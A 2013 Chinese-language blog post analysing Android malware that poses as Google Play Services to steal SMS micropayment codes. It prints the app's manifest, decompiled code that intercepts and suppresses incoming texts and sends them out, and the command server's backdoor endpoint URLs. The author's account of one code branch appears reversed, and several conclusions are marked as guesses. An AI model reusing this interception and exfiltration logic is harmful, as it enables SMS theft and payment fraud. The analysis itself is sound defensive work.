---
layout: post
title: "小額付費簡訊詐騙"
date: 2013-11-09 12:22
comments: true
categories: android
og:
    image: http://farm3.staticflickr.com/2835/10746549465_c046942cc1.jpg
---

最近好像很流行收到這種奇怪的簡訊

<a href="http://www.flickr.com/photos/51077287@N06/10746549465/" title="Flickr 上 sunrisedm4 的 詐騙簡訊"><img src="http://farm3.staticflickr.com/2835/10746549465_c046942cc1.jpg" width="333" height="500" alt="詐騙簡訊"></a>

用 iPhone 點開網址之後發現會被導到一個已經關閉的無名相簿，研究了一下發現他會判斷 `User-Agent` 來決定要導到哪裡，
如果把 `User-Agent` 設成 Android 瀏覽器的話，會被導到一個下載 Andorid apk 的連結

不過大概是新聞報很大的原因，詐騙連結幾乎都已經失效了

把載下來的 apk 拆開會發現它是一個偽裝成 Google Play Service 的程式
（要拆 apk 推薦使用 [androguard](http://code.google.com/p/androguard/) ，它的 Sublime Text plugin 簡直是神器......）

使用到的權限和用到的 components

``` xml AndroidManifest.xml
<?xml version="1.0" ?>
<manifest android:versionCode="1" android:versionName="1.0" package="com.google.android.gmss" xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-sdk android:minSdkVersion="4" android:targetSdkVersion="17"></uses-sdk>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"></uses-permission>
    <uses-permission android:name="android.permission.INTERNET"></uses-permission>
    <uses-permission android:name="android.permission.RECEIVE_SMS"></uses-permission>
    <uses-permission android:name="android.permission.SEND_SMS"></uses-permission>
    <uses-permission android:name="android.permission.WRITE_SMS"></uses-permission>
    <uses-permission android:name="android.permission.READ_SMS"></uses-permission>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"></uses-permission>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"></uses-permission>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
    <uses-permission android:name="android.permission.CALL_PHONE"></uses-permission>
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"></uses-permission>
    <application android:allowBackup="true" android:icon="@7F020002" android:label="@7F050000" android:theme="@7F060001">
        <activity android:label="" android:name="com.google.android.gmss.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN">
                </action>
                <category android:name="android.intent.category.LAUNCHER">
                </category>
            </intent-filter>
        </activity>
        <receiver android:name="com.google.android.gmss.BootBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED">
                </action>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:label="@7F050000" android:name="com.google.android.gmss.MouseCave">
        </service>
        <receiver android:name="com.google.android.gmss.MouseEar">
            <intent-filter android:priority="2147483647">
                <action android:name="android.provider.Telephony.SMS_RECEIVED">
                </action>
                <category android:name="android.intent.category.DEFAULT">
                </category>
            </intent-filter>
        </receiver>
        <receiver android:name="com.google.android.gmss.MouseNose">
            <intent-filter>
                <action android:name="android.intent.action.NEW_OUTGOING_CALL">
                </action>
            </intent-filter>
        </receiver>
        <receiver android:name="com.google.android.gmss.BlackCat">
            <intent-filter>
                <action android:name="com.mouse.BlackCat">
                </action>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

可以看到這個 app 要了一些邪惡的權限，
並且有個 receiver 會偵測 `android.provider.Telephony.SMS_RECEIVED` 這個動作，
在收到簡訊的時候被觸發，是和小額付費比較有相關的地方

``` java me.java
package com.google.android.gmss;
public class MouseEar extends android.content.BroadcastReceiver {
    // ...
            if(v3[v2].getMessageBody().toString().contains("*#060#") == 0) {
                if(com.google.android.gmss.c.a(p8) != 0) {
                    this.abortBroadcast();
                    v1 = new java.util.HashMap();
                    v1.put("type", "1");
                    v1.put("source", v3[v2].getOriginatingAddress().toString());
                    v1.put("content", v3[v2].getMessageBody().toString());
                    new Thread(new com.google.android.gmss.h(this, v1, p8)).start();
                }
            } else {
                this.abortBroadcast();
                v1 = v3[v2].getOriginatingAddress();
                v4 = v3[v2].getMessageBody().substring(6);
                v5 = new java.util.HashMap();
                v5.put("phone_id", v4);
                v5.put("phone_num", v1);
                new Thread(new com.google.android.gmss.g(this, v5, p8)).start();
            }
    // ...
}
```

可以看到在收到新簡訊的時候，會判斷內容有沒有包括特定字串，
有的話就會把整個簡訊內容回傳，如果沒有的話只會回傳前六個字元

再往下追可以找到回報資料的伺服器位置和一些東西，不過當然也失效了

``` java .java
package com.google.android.gmss;
public class l {
    // ...
    static l()
    {
        com.google.android.gmss.l.a = "http://googleapp.leitungsen.de:1652/";
        com.google.android.gmss.l.b = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append("index.php/Backdoor/submit").toString();
        com.google.android.gmss.l.c = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append("index.php/Backdoor/deploy_report").toString();
        com.google.android.gmss.l.d = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append("index.php/Backdoor/task_query").toString();
        com.google.android.gmss.l.e = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append("index.php/Backdoor/get_blockrules").toString();
        com.google.android.gmss.l.f = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append("index.php/Backdoor/phones_query").toString();
        com.google.android.gmss.l.g = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append("index.php/Backdoor/phone_num_submit").toString();
        com.google.android.gmss.l.h = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append("index.php/Backdoor/get_url").toString();
        com.google.android.gmss.l.i = "c84258e9c39059a89ab77d846ddab909";
        com.google.android.gmss.l.j = new java.util.ArrayList();
        return;
    }
    // ...
}
```

裝了惡意程式之後會莫名其妙的被盜用小額付費的原因，
我**猜**應該是小額付費的認證簡訊會包含特定內容，把整封簡訊回傳是為了要拿到小額付費的認證碼，
如果不是小額付費的簡訊，這隻惡意程式會回傳前六個字元的原因，
我**猜**可能是覺得簡訊一開頭很有可能有人名吧，
一但拿到人名 + 電話，就又多了一個詐騙的目標......

